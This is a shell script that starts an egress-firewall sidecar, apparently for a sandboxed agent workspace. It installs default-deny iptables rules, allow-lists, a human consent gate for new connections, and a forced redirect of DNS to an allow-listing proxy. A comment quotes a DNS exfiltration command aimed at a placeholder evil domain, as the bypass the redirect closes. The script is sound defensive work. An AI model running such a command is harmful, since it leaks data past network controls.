#!/bin/sh
# Egress sidecar startup (#2253): install the OUTPUT ruleset + the nat REDIRECT,
# then run the FQDN DNS proxy. Runs in the sidecar (NET_ADMIN) which shares the
# workspace's network namespace.
#
# Loop-avoidance: the nat REDIRECT targets the workspace's configured resolvers
# (read from this sidecar's /etc/resolv.conf — the workspace inherits them via
# --network container:<sidecar>); the proxy forwards to a DIFFERENT upstream
# ($KLANGKNETWORK_EGRESS_UPSTREAM), which the REDIRECT must not match. Any nameserver
# equal to the upstream is skipped (would loop).
set -eu

UPSTREAM="${KLANGKNETWORK_EGRESS_UPSTREAM:-8.8.8.8}"
IPT="${KLANGKNETWORK_IPTABLES:-iptables}"
IPT6="${KLANGKNETWORK_IP6TABLES:-ip6tables}"
LISTEN_PORT="${KLANGKNETWORK_EGRESS_LISTEN_PORT:-15353}"
# fwmark the proxy stamps on its upstream socket (#2264). Must match proxy.py's
# KLANGKNETWORK_EGRESS_MARK. The mark scopes upstream:53 access to the proxy: the
# workspace lacks CAP_NET_RAW/NET_ADMIN and cannot mark, so its :53 traffic is
# REDIRECTed to the proxy (allow-listed) rather than reaching the upstream.
MARK="${KLANGKNETWORK_EGRESS_MARK:-75}"

# --- filter OUTPUT: default-deny + the paths the workspace + proxy need ---
$IPT -P OUTPUT DROP
# IPv6 default-deny (#1936): every host publishes a AAAA; without this an
# IPv6 path bypasses the v4 allow-list. ip6tables ships in the same alpine
# iptables package. The sidecar owns the netns (shared with the workspace
# via --network container:), so this is the authoritative v6 deny (#2255).
$IPT6 -P OUTPUT DROP
# Defense-in-depth (#2275): also disable the v6 stack in this netns. Unlike
# the createContainer-hook sysctl that was dropped (it ran before pasta
# configured the netns and broke pasta's v6 address setup), this runs in the
# sidecar entrypoint — AFTER pasta has configured the netns — so it just
# removes the v6 addresses rather than blocking setup. Best-effort and fully
# silent: rootless per-netns sysctl writability isn't guaranteed (a read-only
# /proc/sys defeats [ -w ] too — access(2) checks mode bits, not the mount),
# and a no-op is fine because the ip6tables DROP above is the certain
# backstop. Redirections apply left-to-right, so 2>/dev/null must precede the
# write target; placed after it, the shell leaks "can't create ..." to the
# still-open stderr (#2656). Written via procfs so no extra package (sysctl
# is in Alpine's procps, not installed).
echo 1 2>/dev/null >/proc/sys/net/ipv6/conf/all/disable_ipv6 || :
# Disable rp_filter (reverse-path) in this netns so the proxy's forged eager-deny
# RST (#2345) is delivered: the RST is sourced from the denied host's IP and
# looped back to the local stack so connect() gets ECONNREFUSED at once; a
# foreign-source packet arriving on lo can trip rp_filter and be silently
# dropped. This is a single-uplink isolated netns with no multipath asymmetry,
# so disabling rp_filter is safe. Best-effort (rootless per-netns writability).
# The 2>/dev/null sits on `done` so it also covers the write redirections
# inside the loop (per-write `>"$f" 2>/dev/null` still leaks the shell's own
# error message — #2656).
for f in /proc/sys/net/ipv4/conf/*/rp_filter; do
  echo 0 >"$f" || true
done 2>/dev/null
# Loopback by *destination* (not -o lo): REDIRECT keeps the packet's original
# output interface, so -o lo misses the redirected :53 packet under a DROP policy.
$IPT -A OUTPUT -d 127.0.0.0/8 -j ACCEPT
$IPT -A OUTPUT -o lo -j ACCEPT
$IPT -A OUTPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
# Only the proxy (marked packets) may reach the upstream resolver directly.
# Unmarked :53 from the workspace is REDIRECTed to the proxy below (#2264).
$IPT -A OUTPUT -d "$UPSTREAM" -p udp --dport 53 -m mark --mark "$MARK" -j ACCEPT
$IPT -A OUTPUT -d "$UPSTREAM" -p tcp --dport 53 -m mark --mark "$MARK" -j ACCEPT

# --- static CIDR allow-specs (host specs are learned dynamically by the proxy).
# A "cidr:port" spec like 10.0.0.0/8:443 is scoped to that TCP port; a bare
# CIDR allows all ports. Per-domain port scoping for hosts is the proxy's
# job (#2256).
IFS=','
for spec in ${KLANGKNETWORK_EGRESS_ALLOW:-}; do
  case "$spec" in
  */*)
    cidr=${spec%%:*}
    port=${spec#*:}
    if [ "$port" = "$spec" ]; then
      $IPT -A OUTPUT -d "$cidr" -j ACCEPT
    else
      $IPT -A OUTPUT -d "$cidr" -p tcp --dport "$port" -j ACCEPT
    fi
    ;;
  esac
done
unset IFS

# --- backend reachability: allow the klangkd backend (LLM proxy + bridge)
# on host.containers.internal. The workspace must reach it to function, and
# host.containers.internal is a /etc/hosts entry (not a DNS lookup), so the
# FQDN proxy can never learn its IP — allow it statically, scoped to the
# backend port only (the klangkd backend is itself authenticated). #2254 B1.
case "${KLANGKNETWORK_EGRESS_BACKEND_PORT:-}" in
'' | *[!0-9]*) ;; # empty or non-numeric (e.g. "socket"): nothing to allow
*)
  gw=$(getent hosts host.containers.internal 2>/dev/null | awk '{print $1; exit}')
  [ -n "$gw" ] && $IPT -A OUTPUT -d "$gw" -p tcp --dport "$KLANGKNETWORK_EGRESS_BACKEND_PORT" -j ACCEPT
  ;;
esac

# --- egress consent gate (#2242 recording -> #2311 half B -> #2324 SYN gate):
# queue blocked packets to the sidecar's own NFQUEUE consumer (proxy.py)
# whenever a consent endpoint is configured. Consent gates the connection SYN,
# not the DNS query: in interactive/allow modes a non-allow-listed name
# resolves (the workspace gets the IP) and the first packet to that IP is
# queued here pending a verdict (allow ->
# pkt.accept() + learn the IP, then conntrack's ESTABLISHED,RELATED rule passes
# the rest); deny/timeout/WS-down -> the proxy forges a RST directly from the
# queue callback so connect() gets ECONNREFUSED at once (#2345), with a
# temporary iptables REJECT (tcp-reset) rule as a backstop); klangkd records the
# decision. In static mode the DNS layer NXDOMAINs off-list names (#3041), so
# the SYNs reaching this queue are IP-literal connects -- their denies are
# recorded the same way.
# Gating the SYN (not the DNS query) gives the human the kernel's connect
# timeout (~127s) instead of a DNS resolver's <=30s getaddrinfo cap. The sidecar
# is the netns owner with NET_ADMIN, so it reads its own NFQUEUE -- no host-side
# /dev/kmsg access or new privilege. Fail-closed: a down consumer means the
# kernel drops queued packets; unmatched traffic hits the OUTPUT DROP policy.
# Rate-limited so a flooding workspace can't overwhelm the consumer; packets
# past the limit miss the match and fall through to DROP (denied).
if [ -n "${KLANGKNETWORK_EGRESS_CONSENT_URL:-}" ]; then
  $IPT -A OUTPUT -m limit --limit 5/sec --limit-burst 20 \
    -j NFQUEUE --queue-num "${KLANGKNETWORK_EGRESS_NFQUEUE_NUM:-5139}"
  # Fail-FAST on consent-queue overflow (#2399): a SYN past the rate limit
  # above misses the NFQUEUE match and would otherwise fall through to the
  # OUTPUT DROP policy -- a dropped SYN makes connect() hang for
  # tcp_syn_retries (~127s) / a curl --max-time (exit 28) instead of failing,
  # with NO consent request surfaced (the SYN never reached the consumer).
  # REJECT (tcp-reset) the overflow so a rate-limited TCP connection gets
  # ECONNREFUSED at once. Still fail-closed (denied); only the failure mode
  # changes (hang -> fast). TCP only: the consent gate is the TCP SYN.
  $IPT -A OUTPUT -p tcp -j REJECT --reject-with tcp-reset
fi

# --- nat OUTPUT: REDIRECT ALL :53 to the proxy, EXCEPT the proxy's own marked
# forwards (loop-avoidance). Redirecting every resolver — not just the
# configured one — closes the direct-to-upstream exfil bypass: a workspace
# `dig @<upstream> <data>.evil` is redirected here and allow-listed (#2264).
$IPT -t nat -A OUTPUT -p udp --dport 53 -m mark --mark "$MARK" -j RETURN
$IPT -t nat -A OUTPUT -p tcp --dport 53 -m mark --mark "$MARK" -j RETURN
$IPT -t nat -A OUTPUT -p udp --dport 53 -j REDIRECT --to-ports "$LISTEN_PORT"
$IPT -t nat -A OUTPUT -p tcp --dport 53 -j REDIRECT --to-ports "$LISTEN_PORT"

exec python3 -m klangksidecar
